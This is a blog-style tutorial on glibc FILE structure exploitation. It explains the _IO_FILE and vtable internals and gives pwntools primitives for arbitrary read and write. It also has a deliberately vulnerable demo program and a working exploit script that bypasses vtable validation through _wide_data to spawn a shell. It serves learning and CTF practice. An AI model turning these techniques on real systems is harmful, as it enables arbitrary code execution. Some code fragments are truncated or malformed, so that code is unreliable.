---
layout: post
title: File Structure Exploitation
description:
date: 2025-12-20
categories:
  - Guide
  - rop
tags:
  - File-Struct-Exploits
  - fsop
---
# File Structure Exploitation

File structure exploitation is an advanced binary exploitation technique that leverages memory corruption vulnerabilities like buffer overflows to overwrite a `FILE` pointer and manipulate the internal data structure used by standard I/O libraries to mange file streams.
## Overview of the FILE Structure

In `GLIBC` the file structures were introduced to improve a program's I/O performances through the use of buffering. 

The file structure is a important component of that standard I/O library in C, representing a file stream. 

`_IO_FILE`
```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

`_flags` is used to record the attribute of File stream such as read only, write, append and so on. It also shows the status of the file buffering status.

```
/* Magic number and bits for the _flags field.  The magic number is
   mostly vestigial, but preserved for compatibility.  It occupies the
   high 16 bits of _flags; the low 16 bits are actual flag bits.  */

#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000
                           /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000


```

Stream buffer pointer is divided into three parts:
1. read buffer.
	- (`_IO_read_ptr`, `_IO_read_end`, `_IO_read_base`)
2. write buffer.
	- (`_IO_write_ptr`, `_IO_write_end,` `_IO_write_base`)
3. reserve buffer.
	- (`_IO_buf_base`, `_IO_buf_end`)

Where the pointers point to:
- `**ptr` points at the current buffer position.
- `**base` points to the beginning of the buffer.
- `**end` points to the end of the buffer.

`_fileno` is a file descriptor from the file which you open, it returns from the system call `open`. 

The `_lock` pointer is used for threaded file access. 

Then there is `_IO_FILE_plus` which is an extension of the FILE structure. It adds the virtual function table also called `vtable`.
`_IO_FILE_plus`
```c
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  struct _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

```

Default file streams (`stdin`, `stdout`, `stderr`) use this extended version. The purpose of using the extended version `_IO_FILE_plus` is to make IO operations faster by having the `vtable`.
### Virtual Function Table

 Array of pointers to the helper functions during executing the IO operation. It is commonly found in `C++` binaries. `vtables` allows for dynamic function resolution at runtime.  The data type for the `vtable` is `_IO_jump_t` which stores the pointer to the needed IO helper methods.

`_IO_jump_t`
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

Very FILE structure is associated with a linked list and the head of the linked list is called 
`_IO_list_all` and the next pointer is called `_chain`


--- 

## Protections

glibc 2.24 - Added memory check for `vtable`
The `vtable` pointer has to be within a memory area within `glibc` 

glibc 2.26 - The `vtable` is moved within a non-writable memory location.

glibc 2.29 - The `vtable` is moved back to writable location

---
## Exploitation

### Arbitrary Write **(Reading Data In)**

Requirements
- Set flag value
- set `read_ptr` = `read_end`
- set `buf_base` to address to write
- set `buf_end` to address to write + length (end point)
- `buf_end` - `buf_base` >= number of bytes to read

We use `fread` to read bytes from `stdin` to a buffer

```c
FILE *fp = fopen("./flag.txt", "r");
read(0, fp, 0x100);
char buf[0x100];
fread(buf, 1, 10, fp);
```

`Pwntools`
```python
addr = 0xdeadbeef # address to write
size = 0x10 # must be larger than bytes read on `fread`
fp = FileStructure()
payload = fp.read(addr, size)
```

### Arbitrary Read **(Writing Data Out)**

Requirements
- set flag value
- set `write_base` to memory to write
- set `write_ptr` to address to write+length
- set `read_end` = `write_base`
- `buf_end` - `buf_base` >= number of bytes to write

We use the `fwrite` function to write a buffer to `stdout`

```c
FILE *fp = fopen("file", "w");
char buf[0x100];
fwrite(buf, 1, 40, fp);
```

`Pwntools`
```python
addr = 0xdeadbeef # address to read
size = 0x10 # must be larger than bytes written on `fwrite`
fp = FileStructure()
payload = fp.write(addr, size)
```

### `vtable` hijacking

the `_IO_jump_` table is full of function pointers which are needed for object oriented programming, if you can overwrite a function pointer inside the `vtable` of a file stream then trigger that function you can control the instruction pointer.

Create our own fake `vtable`, it can be placed anywhere. The place desired execution address at correct offset and then overwrite the `vtable` pointer in the `_IO_File` struct to point to our fake `vtable`. Make sure the `_IO_lock_t`.

`_IO_lock_t` pointer is used in multi-threaded programs to prevent race conditions. An exploit must set `_IO_lock_t` to point to:
- writable location
- with value NULL

```
p *_IO_list_all.file._wide_data._wide_vtable
```

overwrite one of the functions in  `file._wide_data._wide_vtable` that will be called. 


#### Protection mechansims

This functions protect against `vtable` pointer  tampering `IO_validate_vtable` and `_IO_vtable_check`.  Every `vtable` reference is passed through `IO_validate_vtable` (which internally uses `_IO_vtable_check`), In case tampering is detected, the program aborts, otherwise the corresponding `vtable` pointer is returned.

[IO_validate_vtable](https://codebrowser.dev/glibc/glibc/libio/libioP.h.html#IO_validate_vtable)
```c
static inline const struct _IO_jump_t *
IO_validate_vtable(const struct _IO_jump_t *vtable) {
	uintptr_t ptr = (uintptr_t) vtable;
	uintptr_t offset = ptr - (uintptr_t )&_io_vtables;
	if (__glibc_unlikely(offet >= IO_VTABLE_LEN)) _IO_vtable_check();
	return vtable;
}
```

[_IO_vtable_check()](https://codebrowser.dev/glibc/glibc/libio/vtables.c.html#_IO_vtable_check)
```c
void attribute_hidden _IO_vtable_check(void) {
#ifdef SHARED
	void (*flag)(void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
	PTR_DEMANGLE (flag);
	if (flag == &_IO_vtable_check) return;
	
	DL_info di;
	struct link_map *l;
	if
	

}
```

#### Attack 1

https://zhuanlan.zhihu.com/p/660387298

By overwriting the address of the function pointer in the `vtable`, the objective function can be called. However, the is a protection mechanisms that checks if the function address is from `libc`. 

We can bypass this:
`_IO_wfile_overflow` is a `libc` function that can be used as a legal `vtable` entry. `_IO_wfile_overflow` function calls `do_allocbuf` which uses `FILE.wide_data->_wide_vtable` A specific address that can be overwritten and it does not have any protection mechanisms.



`_wide_data` stores a pointer to a file structure that handle wide character streams

If we modify the `vtable` pointer to something like `_IO_wXXXX_jumps`, the `GLIBC` considers it as the wide-character stream and triggers `_IO_wfile_overflow`.  If we can make `_wide_data` point to our fake `_wide_data` `IO_FILE_plus` struct, which then has a `_wide_vtable` pointing to our `exploit_vtable`


```c

```

`wide_data` also contains its own `vtable`, `const struct _IO_jump_t *_wide_vtable`;

Usage 
1. Setup `exploit_vtable` a fake `vtable`
2. setup `file.wide_data->vtable` pointing to the custom `exploit_vtable`.
3. Overrides `FILE.vtable` such that `IO_wfile_overflow` gets called.
4. `IO_wfile_overflow` then calls `do_allocbuf`
5. `do_allocbuf` then calls `file.wide_data->_wide_vtable.`

```
fwrite -> _IO_wfile_overflow -> _IO_wdoallocbuf -> <target addr> (win)
```

When space is limited, structs can be overlapped as long as the offsets accessed return reasonable values.

`glibc_2.36`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void win() {
	puts("You WIN");
	system("/bin/sh");
}
int main() {
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);
	
	printf("win @ %p\nputs @ %p\n", win, puts);

	FILE *fp = fopen("/dev/null", "w");

	char buf[0x1000];
	printf("reading into buf @ %p\n", buf);
	read(0, buf, 0x1000);
	printf("reading into fp: ");
	read(0, fp, 0x1000);

	puts("calling fwrite");
	fwrite(buf, 1, 10, fp);
	exit(0);
}
```

exploit

```python
def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	ru(b"@ ")
	win = int(rl(), 16)
	ru(b"@ ")
	puts = int(rl(), 16)
	libc.address = 0x00007ffff7dc3000#puts - libc.sym['puts']
	
	ru(b"@ ")
	buf = int(rl(), 16)

	print_leak("win", win)
	print_leak("puts", puts)
	print_leak("libc base addr", libc.address)
	print_leak("stack buf", buf)

	exploit_vtable = p64(0)*13 + p64(win)
	wide_data = p64(0)*0x1c + p64(buf+0xe8)
	
	"""
	wide_data {
	...
	_wide_vtable = wide_data+0xe0; (exploit_vtable)
	}
	
	exploit_vtable {
	... 
	win
	}
	"""
	
	sl(wide_data + exploit_vtable)
	fp  = FileStructure(null = buf)
	fp.vtable = libc.sym._IO_wfile_jumps # must be within __libc_IO_vtables
	fp._wide_data = buf
	sla(b"fp: ", bytes(fp))

```

**GOAL**: Overwrite the `vtable` of a FILE structure to hijack control flow.

Modern `GLIBC` checks that:
- `_IO_FILE.vtable` points inside the legitimate `__libc_IO_vtables` region.
- All functions come from `libc`

So we cant place a custom fake `vtable`.

**Bypass**

we can take advantage of two facts:
1. `_IO_wfile_overflow` is a legitimate `libc` function, allowed in the `vtable`
2. It calls `do_allocbuf()` which uses: 

```
fp->_wide_data->_wide_vtable
```

without any security checks.

So we can redirect execution like this:

```
fp->vtable = _IO_wfile_jumps -> fwrite() -> _IO_wfile_overflow() -> _IOwdoallocbuf() -> fp->_wide_data->_wide_vtable -> our_fake_vtable -> win
```

This defeats the `GLIBC` `vtable` check because the main `vtable` is still legit.

```c

```


**Attack steps**

1. Build a fake wide_data structure

```c
wide_data = flat(
	0x0, 
}p64(0)*0x1c + p64(buf+0xe8)
```


---
## Known exploitation techniques

| Name                                                                                                                                                       | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| House of pig                                                                                                                                               | Craft a fake chain of `FILE` structures in the heap to overwrite multiple arbitrary values on exit. Use this primitive to overwrite `__free_hook`. (not possible after 2.34)                                                                                                                                                                                                                                                                                 |
| [House of Kiwi](https://www.anquanke.com/post/id/235598)                                                                                                   | Use a heap overflow to corrupt the top chunk and trigger an assertion on the next `malloc`. The `__malloc_assert` function contains a call to `fflush(stderr)`. Modify the `vtable` of `stderr` so that `_IO_file_sync` points to the `setcontext+61` gadget, which performs a stack pivot relative to `rdx`. Useful when a sandbox prevents calls to `system`. (might have misunderstood this one, because the jump tables are usually mapped as read-only) |
| [House of Emma](https://www.anquanke.com/post/id/260614)                                                                                                   | Bypass `PTR_DEMANGLE` by overwriting the `__pointer_chk_guard` value, then call one of the `_IO_cookie_file` functions, like `_IO_cookie_close`, with a custom `cookie_io_functions_t` function table to execute arbitrary code.                                                                                                                                                                                                                             |
| [House of Apple 1](https://www.roderickchan.cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/) | Similarly to House of Pig, craft a fake chain of `FILE` structures to overwrite multiple arbitrary values on exit. Use this primitive to overwrite `IO_accept_foreign_vtables` and call an arbitrary function, or overwrite `__pointer_chk_guard` like in House of Emma.                                                                                                                                                                                     |
| [House of Apple 2](https://www.roderickchan.cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/) | Abuse the fact that there is no check on the validity of the `_wide_data` `vtable`. Craft a fake jump table and put a one_gadget at the right offset. Trigger the payload by returning from main, calling `exit` or force a call to `__malloc_assert`.                                                                                                                                                                                                       |
| [House of Apple 3](https://www.roderickchan.cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/) | By corrupting the `vtable`, redirect the execution to a method that leads to either the `__libio_codecvt_in`, `__libio_codecvt_out` or `__libio_codecvt_length` function. Setup a precisely crafted fake `_IO_codecvt` structure to execute an arbitrary function.                                                                                                                                                                                           |

---

## FSOP

Control the linked list of file stream
- `_chain`
- `_IO_list_all`

Powerful function
- `_IO_flush_all_lockp`


### `__IO_fluch_all_lockp`


Flushes all file streams.

It is called when `glibc` aborts, by `exit()` or when `main()` returns










---

## References

- [file struct attack](https://chovid99.github.io/posts/file-structure-attack-part-1/#the-usage-of-vtable-in-a-file-structure)
- https://niftic.ca/posts/fsop/
- [angry-fsop](http://blog.kylebot.net/2022/10/22/angry-FSROP/)